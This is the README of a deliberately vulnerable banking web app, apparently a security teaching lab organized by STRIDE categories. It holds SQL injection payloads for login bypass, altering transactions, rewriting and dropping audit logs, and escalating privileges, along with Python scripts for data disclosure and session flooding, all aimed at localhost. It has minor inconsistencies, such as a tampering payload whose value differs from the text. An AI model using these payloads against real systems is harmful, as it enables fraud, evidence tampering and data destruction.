<!-- omit from toc -->
# Banking Web App

This web application is intentionally vulnerable to many attacks, a few of those are SQLi, DoS, Identity Spoofing, and more...

The banking application conforms to the STRIDE Threat Modelling Methodology.

<!-- omit from toc -->
## What does this README.md contain???
- [Spoofing](#spoofing)
  - [Brute Force](#brute-force)
  - [SQLi Attack](#sqli-attack)
  - [Predictable Session Token](#predictable-session-token)
- [Tampering](#tampering)
  - [Payload for Tampering](#payload-for-tampering)
- [Repudiation](#repudiation)
  - [SQL Payload in modifying logs](#sql-payload-in-modifying-logs)
  - [Real-life Example of Repudiation](#real-life-example-of-repudiation)
  - [SQL Payload to drop database](#sql-payload-to-drop-database)
- [Information Disclosure](#information-disclosure)
  - [Unprotected API Endpoints](#unprotected-api-endpoints)
  - [Error Message Leaks](#error-message-leaks)
  - [Database Dump](#database-dump)
  - [Attack Simulation script using Python](#attack-simulation-script-using-python)
- [Denial of Service](#denial-of-service)
  - [SQL Payload for DoS:](#sql-payload-for-dos)
  - [API Endpoint Exploitation (assuming the database has numerous transactions)](#api-endpoint-exploitation-assuming-the-database-has-numerous-transactions)
  - [Session Storage Bomb](#session-storage-bomb)
- [Elevation of Privilege](#elevation-of-privilege)
  - [SQL Payload for Privilege Escalation](#sql-payload-for-privilege-escalation)


### Spoofing
This web app has:
- Weak Authentication System
- Predictable Session Tokens
- SQL injection in Login (Raw user input is concatinated into SQL)
- Accepts any password (NO password complexity, means any password is accepted, even 1-character passwords)
- Example of Spoofing Attempt:
  - Discover valid usernames (GET /api/users.php)
  - Below are examples on attacks that you can do to this web app

#### Brute Force
Python Code for Brute Force Attack:
```python
# Check vuln_scripts/brute_force.py
```
---

#### SQLi Attack
```
Username: admin' --
Password: [anything]
```
---
#### Predictable Session Token
Predict the session token
```python
token = hashlib.md5("admin" + str(int(time.time()))).hexdigest()
```

---------------------------
### Tampering

**Tampering** in STRIDE refers to the act of **unauthorized modification of data**. This allows the attacker to edit, or delete files or data. In this system, since the web app is vulnerable to SQLi, the attacker can send a payload in the `Search Transaction` part of the `All Transactions` Page.

#### Payload for Tampering
This payload **modifies** the **amount of the transaction** with the ID of **number 3** from **whatever the initial value** is, to **10000**.

```sql
'; UPDATE transactions SET amount=2500 WHERE id = 3; --
```

---------------------------

### Repudiation

**Repudiation** refers to situations where users can **deny performing certain actions** because of the **lack of** the **system's evidence** to **prove otherwise**.

In this web app, the system `has vulnerabilities` to its way of `storing logs`. Logs are stored in the same database with no backups done. This `no backing up` of the `logs` `allow attackers` to `manipulate it` to `wipe out their actions` and to refute the claim that they done something to the system because there are no logs to prove it.

#### SQL Payload in modifying logs

```sql
'; UPDATE audit_logs SET user_id = 2 WHERE user_id = 1; --
```

#### Real-life Example of Repudiation

```html
<!-- Illegal Money Transfer -->
POST /transfer.php?amount=1000&recipient=attacker

<!-- Modification of Logs -->
 GET /search.php?query=';UPDATE+audit_logs+SET+user_id=3+WHERE+action='MONEY_TRANSFER';--
```

Since there is no logging done when the log itself are altered (i.e. secondary audit trail or syslog), the attacker can: 

1. Disable logging through some attack
2. Perform Malicious Actions
3. Re-enable logging


Or entierly drop the database of the logs.

#### SQL Payload to drop database

```sql
'; DROP DATABASE audit_logs;
```


---------------------------
### Information Disclosure

**Information Disclosure** refers to the vulnerabilities that **expose sensitive data to unauthorized personnel**. This can mean an **attacker** who **gained access** to data **by privilege escalation**, a **user** who **just happened** to **see the database**, or an **unauthorized employee** that has a **misconfigured account** which **has an administrative rights** (and many more scenarios).

Below are the examples of how this web app presents the Information Disclosure threats.

#### Unprotected API Endpoints

```http
GET /api/users.php
```

This exposes the user accounts without having to authenticate if the one accessing has the privileges to do so.

#### Error Message Leaks
Try searching `' OR 1=1 --` in `transactions.php` page.

This attack allows the hacker to read the structure of the database by doing multiple searches with different payloads and eventually, after some time... they get to map out the structure of the database.

#### Database Dump
If, somehow, the attacker found a way to see the directories of the web application, they can do something like `localhost/vulnerable-app/database.sql`. This downloads the file `database.sql` wherein they can see the commands ran to create the database of this web app. **Assuming** that we have **multiple users accessing their records** and **the admin watching the logs**, the **attacker** now has an **idea of the structure** and **can execute sql commands using SQLi** to **drop databases** and delete everything.

#### Attack Simulation script using Python

```python
import requests

TARGET = "http://localhost/vulnerable-app"

def fetch_sensitive_data():
    # 1. Dump all users via API
    users = requests.get(f"{TARGET}/api/users.php").json()
    print("[+] Stolen user data:", users)

    # 2. Exploit IDOR to get admin profile
    admin_profile = requests.get(f"{TARGET}/profile.php?id=1", 
                               cookies={"PHPSESSID": "stolen_session"}).text
    print("[+] Admin profile:", admin_profile[:200] + "...")

    # 3. Trigger SQL error to leak DB structure
    response = requests.get(f"{TARGET}/transactions.php?search=' OR 1=1 -- ")
    if "SQLSTATE" in response.text:
        print("[+] DB structure leaked in error!")

fetch_sensitive_data()
```

Sample Output:

```console
[+] Stolen user data: [{"id":1,"username":"admin",...}]
[+] Admin profile: <h1>Admin Profile</h1>...
[+] DB structure leaked in error!
```

How to run:
1. Create python file in ../vulnerable-app
2. Create venv (if does not exists yet)
3. Activate venv
4. pip install requests, urllib3
5. Execute this command: python .\info_disclose.py > output.txt
6. Check the output.txt file for the output of the python code.


---------------------------
### Denial of Service

**Denial of Service** in this web app is presented by **misconfiguration and insecure coding practices** when it comes to logging in.

- `login.php` has no rate limiting, no CAPTCHA, and no IP-based throttling

- `/dos_attack.py ` has the DoS python script that if run multiple times, it can disrupt the user's attempt to login by flooding the server with bogus traffic.

- `transactions.php`'s search field is vulnerable to SQLi. Which means we can run this query.

#### SQL Payload for DoS:
```sql
' OR (SELECT SLEEP(10)) -- 
```

#### API Endpoint Exploitation (assuming the database has numerous transactions)
```
GET /api/transactions.php?limit=1000000
```

#### Session Storage Bomb
- The attacker can flood the server with fake sessions
```python
import requests

for i in range(10000):
    requests.get("http://localhost/login.php", cookies={
        "PHPSESSID": f"malicious_session_{i}"
    })
```

---------------------------
### Elevation of Privilege

**Elevation of Privilege** is seen in this web app by the **ability of a normal user** to **execute sql commands** to **elevate their access to admin**.

This payload exploits the vulnerability of the system towards SQLi by modifying the role of user1 to become `admin` instead of `user`

#### SQL Payload for Privilege Escalation
```sql
'; UPDATE users SET role='admin' WHERE username='user1' -- 
```

Elevation of Privilege in this system is limited since there is no access to a separate server. But if you would opt to run this on a different machine, you can do some shenanigans and run scripts via XAMPP that would allow you to modify the machine itself rather than just modifying the database contents.